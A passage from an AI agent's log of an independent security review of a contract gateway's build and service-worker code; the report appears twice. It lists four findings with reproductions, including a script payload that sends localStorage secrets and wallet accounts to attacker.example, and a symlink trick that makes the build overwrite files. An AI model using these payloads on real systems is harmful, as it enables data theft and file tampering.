++The URL does not even provide authenticated RPC access: browser Fetch/`Request` rejects an HTTP(S) URL containing embedded credentials before sending it. With only that endpoint, every call becomes a 502; with later endpoints, the leaked credential remains in the deployable and the first entry fails on every call.
++
++**One-line reproduction:** Use `{"1":["https://rpc-user:s3cr3t@rpc.example/v1"]}` as the chains file, build, and inspect `index.html` or `gw44-sw.js`; `s3cr3t` is present in public output while calls through that entry fail at `fetch()`.
++
++### F4 — Medium — Output writes follow attacker-planted symbolic links
++
++**Location:** `tools/build.ts:114`
++
++The pre-write output check compares directory entry names only. It never `lstat`s the three expected entries or rejects an output directory that is itself a symlink. The subsequent `writeFile` calls follow symbolic links, as do the hashing reads. Thus an output directory containing only the three expected names passes the stray-file gate even when one or more names point outside it, and the build truncates and replaces arbitrary files writable by the build user. The post-write name assertion also passes because the directory names did not change.
++
++This matters for reused CI workspaces, restored build caches, or any workflow in which another principal can prepare the output directory but cannot directly write the build user's other files.
++
++**One-line reproduction:** Pre-create `GW44_OUT/index.html` as a symlink to a writable `../victim` and make `404.html` and `gw44-sw.js` ordinary files, then run the build; the stray-name check passes and the generated page overwrites `victim`.
++
++## Required-surface notes (not additional findings)
++
++### Contract selection and redirects
++
++- An unpinned build ships `parseTarget`: host form accepts only a lower-case-normalized 20-byte address in the first hostname label and a canonical decimal chain in the second; path form is considered only on loopback and validates the decoded chain/address. Public-host path forms do not reach contracts.
++- A one-contract build ships `pinnedTarget`, ignores the hostname, and maps the entire decoded path to the sole configured contract. A path that resembles another shape is only that contract's resource.
++- A several-chains build also ships `pinnedTarget`; the decoded first segment must be an own key of `pins.contracts`. Root redirects to the configured default and an unknown segment throws before an RPC call. Percent-encoding can spell a configured segment but cannot introduce an unconfigured contract.
++- All constructed redirects begin with a literal `/`: loopback address canonicalization at `target.ts:103`, default-chain redirect at `target.ts:213`, and chain trailing-slash redirect at `target.ts:222`. Query strings are retained. The boot navigation explicitly appends the fragment; browser HTTP redirects retain a fragment when the destination supplies none. None of these URL-derived values can create a scheme-relative or cross-origin destination.
++
++### Contract-controlled response metadata and inline rendering
++
++- `request()` accepts status 200–599, suppresses bodies for 204/205/304, and defaults to `application/octet-stream`. A contract can deliberately select an active type such as `text/html`, JavaScript, or SVG; those bytes receive the normal browser behavior for that type at the contract's gateway origin. This is the intended content authority and is what makes F1 consequential in a shared-origin build.
++- The header allowlist excludes `Set-Cookie`, `Clear-Site-Data`, `Location`, authentication headers, and arbitrary names. Values containing controls other than horizontal tab are dropped. `cache-control: no-store` and `x-content-type-options: nosniff` are always supplied. The passed CSP, framing, opener/embedder, permissions, CORS, disposition, language, and referrer headers can materially change browser behavior, but remain within the content authority already given to that contract.
++- The no-worker path writes root `html()` bytes into the live document and therefore executes contract-chosen active HTML at the gateway origin. It does so only top-level, only for a root target, and only when the response has no policy it cannot reproduce; the sole allowed otherwise-unhonourable header is the exact root `frame-ancestors 'self'` policy, for which the top-level check is stricter. No deeper contract path is written inline.
++
++### Worker, loop guard, RPC body handling, and ABI
++
++- The worker intercepts same-origin GET and HEAD requests only when `targetOf` names (or throws while parsing) a target. Cross-origin traffic, non-read methods, and unowned same-origin URLs go to the network/static host. The exact worker pathname is reserved and answered locally with 404 before contract routing.
++- A contract document can corrupt the session counter, but malformed and future values fail closed at `MAX_ATTEMPTS`; they suppress worker reload/reinstallation rather than resetting the count or causing the boot script itself to loop. Cross-chain abuse of that shared state is included in F1.
++- The RPC reader counts decoded response-stream bytes, cancels after 16 MiB, and applies a 10-second abort signal to each fetch/body read. Endpoints are tried in configuration order. The missing list-wide budget is F2.
++- Hostile ABI words are limited to 48-bit safe integers, every word/string access is bounds-checked, the header count is capped at 64, and total referenced key/value bytes are capped before UTF-8 decoding. Body data is a bounded subarray of the already capped RPC result. I found no attacker-selected unbounded allocation, out-of-bounds read, or input-bounded loop beyond those caps.
++
++### Build injection
++
++`parsePin`, `parsePins`, and `parseChains` constrain the values used by esbuild, and `JSON.stringify` makes the `define` substitutions code-safe. `inlineBoot` neutralizes case-insensitive `</script` and `<!--` sequences before inserting the boot bundle into the HTML shell. I found no script-injection path through the pin/config/endpoint strings beyond the credential disclosure in F3. Filesystem output handling is separately affected by F4.
+
+codex
+Completed the independent review and wrote the report to [full-report.md](/tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md).
+
+It contains four findings: one High and three Medium. The reviewed tree remains unchanged.
+diff --git a//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md b//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..7388dc0c0ef6ce377bdbe4d61eb87514c80364c4
+--- /dev/null
++++ b//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+@@ -0,0 +1,80 @@
++# Independent security review
++
++## Execution constraints
++
++I read all 15 scoped files in full and made no changes to the reviewed tree. Network access was not used, as required. The deliberately reduced tree contains no package manifest, installed build dependency, tests, or browser harness, so I could not run the complete esbuild build or browser/service-worker integration tests. I used static analysis and small local Node probes for URL and `Request` behavior; in particular, I confirmed that `parseChains` accepts a URL containing userinfo while the platform `Request` constructor rejects that URL.
++
++## Severity scale
++
++- **Critical:** direct, broadly reachable compromise of users or the build/deployment environment with little or no special precondition.
++- **High:** major confidentiality or integrity loss within the gateway origin or its granted permissions, with a realistic configuration/user precondition.
++- **Medium:** practical denial of service, secret exposure, or build-host integrity loss that requires a meaningful configuration or local precondition.
++- **Low:** limited impact, or impact requiring unusually strong local/deployer control.
++
++## Findings
++
++### F1 — High — Every configured chain can exercise every other chain's origin authority
++
++**Location:** `src/core/target.ts:204`
++
++In the several-chains build, `pinnedTarget` selects the contract using the first path component, but all selected documents are still served by the same origin and service-worker registration. The path prefix is routing, not isolation. Active content returned by any one configured contract can read and overwrite the origin's `localStorage`, IndexedDB, Cache Storage, and other origin state used by every sibling contract; access same-origin windows and fetch sibling-chain resources; unregister the gateway worker; and exercise permissions granted to that origin. In particular, injected wallet providers commonly key authorization by origin, so a contract on a less-trusted chain can see authorized accounts and solicit signatures/transactions in the authority context the visitor associated with another configured chain.
++
++The boot counter makes one concrete cross-chain availability attack easy: a sibling document can unregister the worker and set `sessionStorage["gw44:boot"]` to an invalid or future value. The next sibling-chain load refuses to reinstall the worker and can render only its root inline, leaving its routed subresources unavailable. The stricter counter parser prevents a reload loop, but it cannot provide isolation against a same-origin sibling.
++
++**One-line reproduction:** Build with chain 1 and chain 10 in `GW44_CONFIG`, visit `/1/` and grant the origin wallet access/store `localStorage.secret`, then let chain 10's `html()` return `<script>fetch('https://attacker.example/?s='+encodeURIComponent(localStorage.secret),{mode:'no-cors'});ethereum.request({method:'eth_accounts'}).then(x=>fetch('https://attacker.example/?a='+encodeURIComponent(JSON.stringify(x)),{mode:'no-cors'}))</script>` at `/10/`.
++
++### F2 — Medium — Endpoint count multiplies the timeout without an aggregate deadline
++
++**Location:** `src/adapters/rpc/fetch.ts:85`
++
++Each endpoint receives a fresh 10-second timeout and the endpoints are awaited serially. Neither `createFetchRpc` nor its boot/worker callers impose an overall deadline, while `parseChains` places no count limit on an endpoint list and does not reject duplicates (`tools/chains.ts:41`). Consequently a syntactically valid chains file can turn one navigation into minutes of pending service-worker work. The 16 KiB worker-size check limits the most extreme input only indirectly; dozens or hundreds of repeated short URLs still fit and multiply the timeout. Concurrent navigations compound the retained fetch/stream and worker-event resources.
++
++This is distinct from trusting an endpoint's answer: the endpoint need not return a false result. It only has to accept each request and fail to answer before that attempt's timeout.
++
++**One-line reproduction:** Build chain 1 with the same attacker-controlled HTTPS endpoint repeated 50 times, have it accept every request but send no response, then request any chain-1 resource; the gateway can remain pending for roughly `50 × 10 s` before returning 502.
++
++### F3 — Medium — Credential-bearing RPC URLs are accepted, published, and unusable
++
++**Location:** `tools/chains.ts:50`
++
++Endpoint validation checks only the parsed protocol and hostname. It does not reject `URL.username` or `URL.password`, and it stores the original string rather than a credential-free normalized URL. `tools/build.ts:75` then injects that entire value into both public browser bundles (the worker and the boot script embedded in the page). A deployer who supplies a Basic-auth-style RPC URL therefore publishes the credential to every visitor and static-asset reader.
++
++The URL does not even provide authenticated RPC access: browser Fetch/`Request` rejects an HTTP(S) URL containing embedded credentials before sending it. With only that endpoint, every call becomes a 502; with later endpoints, the leaked credential remains in the deployable and the first entry fails on every call.
++
++**One-line reproduction:** Use `{"1":["https://rpc-user:s3cr3t@rpc.example/v1"]}` as the chains file, build, and inspect `index.html` or `gw44-sw.js`; `s3cr3t` is present in public output while calls through that entry fail at `fetch()`.
++
++### F4 — Medium — Output writes follow attacker-planted symbolic links
++
++**Location:** `tools/build.ts:114`
++
++The pre-write output check compares directory entry names only. It never `lstat`s the three expected entries or rejects an output directory that is itself a symlink. The subsequent `writeFile` calls follow symbolic links, as do the hashing reads. Thus an output directory containing only the three expected names passes the stray-file gate even when one or more names point outside it, and the build truncates and replaces arbitrary files writable by the build user. The post-write name assertion also passes because the directory names did not change.
++
++This matters for reused CI workspaces, restored build caches, or any workflow in which another principal can prepare the output directory but cannot directly write the build user's other files.
++
++**One-line reproduction:** Pre-create `GW44_OUT/index.html` as a symlink to a writable `../victim` and make `404.html` and `gw44-sw.js` ordinary files, then run the build; the stray-name check passes and the generated page overwrites `victim`.
++
++## Required-surface notes (not additional findings)
++
++### Contract selection and redirects
++
++- An unpinned build ships `parseTarget`: host form accepts only a lower-case-normalized 20-byte address in the first hostname label and a canonical decimal chain in the second; path form is considered only on loopback and validates the decoded chain/address. Public-host path forms do not reach contracts.
++- A one-contract build ships `pinnedTarget`, ignores the hostname, and maps the entire decoded path to the sole configured contract. A path that resembles another shape is only that contract's resource.
++- A several-chains build also ships `pinnedTarget`; the decoded first segment must be an own key of `pins.contracts`. Root redirects to the configured default and an unknown segment throws before an RPC call. Percent-encoding can spell a configured segment but cannot introduce an unconfigured contract.
++- All constructed redirects begin with a literal `/`: loopback address canonicalization at `target.ts:103`, default-chain redirect at `target.ts:213`, and chain trailing-slash redirect at `target.ts:222`. Query strings are retained. The boot navigation explicitly appends the fragment; browser HTTP redirects retain a fragment when the destination supplies none. None of these URL-derived values can create a scheme-relative or cross-origin destination.
++
++### Contract-controlled response metadata and inline rendering
++
++- `request()` accepts status 200–599, suppresses bodies for 204/205/304, and defaults to `application/octet-stream`. A contract can deliberately select an active type such as `text/html`, JavaScript, or SVG; those bytes receive the normal browser behavior for that type at the contract's gateway origin. This is the intended content authority and is what makes F1 consequential in a shared-origin build.
++- The header allowlist excludes `Set-Cookie`, `Clear-Site-Data`, `Location`, authentication headers, and arbitrary names. Values containing controls other than horizontal tab are dropped. `cache-control: no-store` and `x-content-type-options: nosniff` are always supplied. The passed CSP, framing, opener/embedder, permissions, CORS, disposition, language, and referrer headers can materially change browser behavior, but remain within the content authority already given to that contract.
++- The no-worker path writes root `html()` bytes into the live document and therefore executes contract-chosen active HTML at the gateway origin. It does so only top-level, only for a root target, and only when the response has no policy it cannot reproduce; the sole allowed otherwise-unhonourable header is the exact root `frame-ancestors 'self'` policy, for which the top-level check is stricter. No deeper contract path is written inline.
++
++### Worker, loop guard, RPC body handling, and ABI
++
++- The worker intercepts same-origin GET and HEAD requests only when `targetOf` names (or throws while parsing) a target. Cross-origin traffic, non-read methods, and unowned same-origin URLs go to the network/static host. The exact worker pathname is reserved and answered locally with 404 before contract routing.
++- A contract document can corrupt the session counter, but malformed and future values fail closed at `MAX_ATTEMPTS`; they suppress worker reload/reinstallation rather than resetting the count or causing the boot script itself to loop. Cross-chain abuse of that shared state is included in F1.
++- The RPC reader counts decoded response-stream bytes, cancels after 16 MiB, and applies a 10-second abort signal to each fetch/body read. Endpoints are tried in configuration order. The missing list-wide budget is F2.
++- Hostile ABI words are limited to 48-bit safe integers, every word/string access is bounds-checked, the header count is capped at 64, and total referenced key/value bytes are capped before UTF-8 decoding. Body data is a bounded subarray of the already capped RPC result. I found no attacker-selected unbounded allocation, out-of-bounds read, or input-bounded loop beyond those caps.
++
++### Build injection
++
++`parsePin`, `parsePins`, and `parseChains` constrain the values used by esbuild, and `JSON.stringify` makes the `define` substitutions code-safe. `inlineBoot` neutralizes case-insensitive `</script` and `<!--` sequences before inserting the boot bundle into the HTML shell. I found no script-injection path through the pin/config/endpoint strings beyond the credential disclosure in F3. Filesystem output handling is separately affected by F4.
+
+tokens used
+53,033
+Completed the independent review and wrote the report to [full-report.md](/tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md).
+
+It contains four findings: one High and three Medium. The reviewed tree remains unchanged.
